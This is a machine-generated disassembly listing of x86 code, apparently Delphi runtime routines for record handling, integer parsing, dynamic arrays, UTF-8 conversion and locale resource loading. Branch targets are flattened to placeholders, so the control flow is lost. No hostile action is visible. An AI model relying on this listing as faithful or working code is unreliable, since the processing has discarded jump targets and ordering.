mov edx ebx
mov eax [ edi ]
call sub_4028d8
mov eax esi
sub_4048bc
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4048ec
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_4048ec
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4048ec
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4048bc
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402838
sub_404980
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4049cc
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_4049cc
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403f74
jmp r-xdata
call sub_403f50
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404648
jmp r-xdata
call sub_404630
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_4049b4
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4049cc
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404980
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4057bc
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_405110
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402838
sub_404adc
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028d8
mov edx [ eax + esi ]
add eax ebx
call sub_403fa4
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_40466c
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404ac4
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028d8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404bf8
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404adc
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4057d4
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_40514c
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402838
sub_404bf8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403fa4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40466c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404ac4
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404bf8
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404adc
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4057d4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_40514c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402838
sub_404cf4
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404d18
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402918
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402918
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404cf4
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_404f78
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404f70
jmp r-xdata
mov al 0x4
call sub_402838
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402838
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40271c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026dc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402b5c
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_4049cc
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028d8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402b5c
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404f58
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404f78
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_405110
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026fc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_4049cc
sub_40514c
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_405110
pop edx
pop eax
sub_405174
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012ec
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_4051a4
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40127c
mov eax esp
mov dl 0x1
call sub_4053e0
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_4051ec
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_4051a4
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405228
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401284
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40128c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405214
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405214
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405214
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_40125c
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_401254
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4053e0
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40127c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012d4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4054e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405228
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012dc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012d4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012dc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012d4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40129c
push eax
call sub_401274
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405680
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026fc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026fc
jmp r-xdata
sub_4056e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_40571b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_40574c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4057b0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4056e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4057b7
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4057d4
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405800
test edx edx
je sub_4057bc
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402838
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4058a4
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_401314
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4058cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_4059a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
